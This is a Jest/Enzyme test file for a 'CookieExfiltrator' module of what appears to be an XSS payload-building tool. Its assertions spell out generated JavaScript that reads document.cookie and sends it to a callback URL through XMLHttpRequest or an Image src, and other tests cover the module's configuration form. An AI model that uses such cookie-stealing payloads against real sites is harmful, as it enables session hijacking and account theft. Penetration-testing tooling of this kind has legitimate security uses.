import { shallow } from 'enzyme'
import { cook, render, validate, init } from './CookieExfiltrator'

describe('CookieExfiltrator', () => {
  describe('.cook', () => {
    describe('if a cookie name is specified', () => {
      it('should exfiltrate only the specified cookie', () => {
        const payload = cook({
          cookie: 'jenny'
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            'var c = document.cookie.match(new RegExp(\'(^| )jenny=([^;]+)\'));)[2]'
          )
        )
      })
    })

    describe('if a cookie name is not specified', () => {
      it('should exfiltrate the entire document cookie', () => {
        const payload = cook({}, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            'var c = document.cookie'
          )
        )
      })
    })

    describe('if the exfiltration method is `post:ajax`', () => {
      it('should post the cookie using an XMLHttpRequest', () => {
        const payload = cook({
          id: 'instance-id',
          callbackUrl: 'http://127.0.0.1/',
          method: 'post:ajax'
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            `ajaxRequest('POST', 'http://127.0.0.1/', c, instance-id-cb)`
          )
        )
      })
    })

    describe('if the exfiltration method is `get:dom`', () => {
      it('should create an <img /> to exfiltrate the cookie', () => {
        const payload = cook({
          callbackUrl: 'http://127.0.0.1/',
          method: 'get:dom'
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            'var i = new Image()'
          )
        )

        expect(payload).toEqual(
          expect.stringContaining(
            `i.src = 'http://127.0.0.1/?c=' + c`
          )
        )
      })
    })

    describe('if the exfiltration method is `get:ajax`', () => {
      it('should exfiltrate the cookie using an XMLHttpRequest', () => {
        const payload = cook({
          id: 'instance-id',
          callbackUrl: 'http://127.0.0.1/',
          method: 'get:ajax'
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            `ajaxRequest('GET', 'http://127.0.0.1/?c=' + c, undefined, instance-id-cb)`
          )
        )
      })
    })

    describe('if the "wait for request to finish" option is enabled', () => {
      it('should place the next entry point in the callback', () => {
        const payload = cook({
          id: 'instance-id',
          callbackUrl: 'http://127.0.0.1/',
          method: 'get:ajax',
          waitForResponse: true
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            `var instance-id-cb = function () { __XSS_CHEF_ENTRY_POINT__ }`
          )
        )

        expect(payload).not.toMatch(/__XSS_CHEF_ENTRY_POINT__$/)
      })
    })

    describe('if the "wait for request to finish" option is not enabled', () => {
      it('should place the next entry point at the end of the script', () => {
        const payload = cook({
          id: 'instance-id',
          callbackUrl: 'http://127.0.0.1/',
          method: 'get:ajax',
          waitForResponse: false
        }, {
          payload: '__XSS_CHEF_ENTRY_POINT__'
        }).payload

        expect(payload).toEqual(
          expect.stringContaining(
            `var instance-id-cb = function () { }`
          )
        )

        expect(payload).toMatch(/__XSS_CHEF_ENTRY_POINT__$/)
      })
    })
  })

  describe('.validate', () => {
    describe('if `instance.callbackUrl` is empty', () => {
      it('should return false', () => {
        const valid = validate({ callbackUrl: '' })
        expect(valid).toBe(false)
      })
    })

    describe('if all checks pass', () => {
      it('should return true', () => {
        const valid = validate({
          callbackUrl: 'http://127.0.0.1'
        })

        expect(valid).toBe(true)
      })
    })
  })

  describe('.init', () => {
    it('should define {callbackUrl}', () => {
      expect(init().callbackUrl).toBeDefined()
    })

    it('should default {method} to `post:ajax`', () => {
      expect(init().method).toBe('post:ajax')
    })

    it('should default {waitForResponse} to `true`', () => {
      expect(init().waitForResponse).toBe(true)
    })
  })

  describe('.render', () => {
    const instance = init()

    it('should render a textbox bound to `instance.callbackUrl`', () => {
      const textBox = shallow(
        render(Object.assign({}, instance, { callbackUrl: 'test' }))
      ).find('input[type="text"]')

      expect(textBox).toHaveLength(1)
      expect(textBox.props().value).toBe('test')
    })

    it('should render a dropdown list bound to `instance.method`', () => {
      const dropDown = shallow(render(instance)).find('select')
      expect(dropDown).toHaveLength(1)
      expect(dropDown.props().value).toBe('post:ajax')
    })

    it('should render an option for the POST: AJAX method', () => {
      const dropDown = shallow(render(instance)).find('select')
      const option = dropDown.find('option[value="post:ajax"]')
      expect(option).toHaveLength(1)
      expect(option.text()).toBe('POST: AJAX')
    })

    it('should render an option for the GET: DOM method', () => {
      const dropDown = shallow(render(instance)).find('select')
      const option = dropDown.find('option[value="get:dom"]')
      expect(option).toHaveLength(1)
      expect(option.text()).toBe('GET: DOM')
    })

    it('should render an option for the GET: AJAX method', () => {
      const dropDown = shallow(render(instance)).find('select')
      const option = dropDown.find('option[value="get:ajax"]')
      expect(option).toHaveLength(1)
      expect(option.text()).toBe('GET: AJAX')
    })

    it('should render a checkbox bound to `instance.waitForResponse`', () => {
      const createWrapper = (waitForResponse) => shallow(
        render(
          Object.assign({}, instance, { waitForResponse: waitForResponse }),
          jest.fn()
        )
      )

      let checkBox = createWrapper(true)
        .find('input[type="checkbox"]')
        .findWhere(e => e.props().id.match(/.+?-waitForResponse/))

      expect(checkBox).toHaveLength(1)
      expect(checkBox.props().checked).toBe(true)

      checkBox = createWrapper(false)
        .find('input[type="checkbox"]')
        .findWhere(e => e.props().id.match(/.+?-waitForResponse/))

      expect(checkBox).toHaveLength(1)
      expect(checkBox.props().checked).toBe(false)
    })
  })
})
